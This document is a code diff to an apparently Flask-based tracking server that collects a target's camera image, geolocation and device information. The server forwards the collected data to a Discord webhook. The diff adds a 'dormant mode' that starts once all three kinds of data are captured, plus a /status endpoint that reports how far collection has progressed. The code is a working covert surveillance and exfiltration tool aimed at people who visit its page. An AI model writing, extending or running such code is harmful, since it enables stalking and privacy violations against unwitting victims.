@@ -20,6 +20,18 @@ from utils import get_file_data, update_webhook, check_and_get_webhook_url
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
 
+# Dormant mode flags
+data_tracker = {
+    'image': False,
+    'device_info': False,
+    'location': False
+}
+dormant_mode = False   # Whether server is in dormant mode
+dormant_lock = threading.Lock()
+
+# Data types we expect to receive
+REQUIRED_DATA = {'image', 'device_info', 'location'}
+
 HTML_FILE_NAME = "index.html"
 
 if sys.stdout.isatty():
@@ -50,6 +62,73 @@ def should_exclude_line(line):
     ]
     return any(pattern in line for pattern in exclude_patterns)
 
+def enter_dormant_mode():
+    """Server enters dormant/sleep mode after ALL data received"""
+    global dormant_mode
+    with dormant_lock:
+        dormant_mode = True
+        print(f"{Y}[!] All data collected. Server entering dormant mode...{W}")
+        logging.info("Server entering dormant mode - all data received")
+
+def exit_dormant_mode():
+    """Server wakes up when probed"""
+    global dormant_mode
+    with dormant_lock:
+        if dormant_mode:
+            dormant_mode = False
+            print(f"{G}[+] Server woken up from dormant mode!{W}")
+            logging.info("Server woken up from dormant mode - probe received")
+
+def is_dormant():
+    """Check if server is in dormant mode"""
+    with dormant_lock:
+        return dormant_mode
+
+def all_data_received():
+    """Check if all required data has been received"""
+    return all(data_tracker.values())
+
+def mark_data_received(data_type):
+    """Mark a data type as received and check if all data is complete"""
+    global dormant_mode
+    
+    if data_type in data_tracker:
+        data_tracker[data_type] = True
+        print(f"{G}[+] Received {data_type}{W}")
+        logging.info(f"Data received: {data_type}")
+        
+        # Check progress
+        received_count = sum(data_tracker.values())
+        total_count = len(REQUIRED_DATA)
+        print(f"{B}[*] Progress: {received_count}/{total_count} data types received{W}")
+        
+        # Enter dormant if all data received
+        if all_data_received() and not is_dormant():
+            enter_dormant_mode()
+            return True
+    
+    return False
+
+@app.before_request
+def check_dormant_status():
+    """Wake up server if probed while dormant"""
+    if is_dormant():
+        exit_dormant_mode()
+
+@app.route("/status", methods=["GET"])
+def status_check():
+    """Check server status - dormant or active, and data collection progress"""
+    return jsonify({
+        "status": "dormant" if is_dormant() else "active",
+        "all_data_received": all_data_received(),
+        "data_progress": {
+            "image": data_tracker['image'],
+            "device_info": data_tracker['device_info'],
+            "location": data_tracker['location']
+        },
+        "timestamp": datetime.now().isoformat()
+    }), 200
+
 @app.route("/", methods=["GET"])
 def get_website():
     html_data = ""
@@ -68,6 +147,10 @@ def update_location():
     data = request.json
     discord_webhook = check_and_get_webhook_url(os.getcwd())
     update_webhook(discord_webhook, data)
+    
+    # Mark location as received and check if all data is complete
+    mark_data_received('location')
+    
     return "OK"
 
 @app.route('/image', methods=['POST'])
@@ -81,6 +164,9 @@ def image():
     files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
     response = requests.post(webhook_url, files=files)
 
+    # Mark image as received and check if all data is complete
+    mark_data_received('image')
+
     return Response("%s saved and sent to Discord webhook" % f)
 
 @app.route('/get_target', methods=['GET'])
@@ -92,6 +178,9 @@ def receive_device_info():
     """Receive and process device information with VPN detection"""
     try:
         data = request.get_json()
+        
+        # Mark device_info as received and check if all data is complete
+        mark_data_received('device_info')
         
         # Server-side VPN detection
         client_ip = request.remote_addr
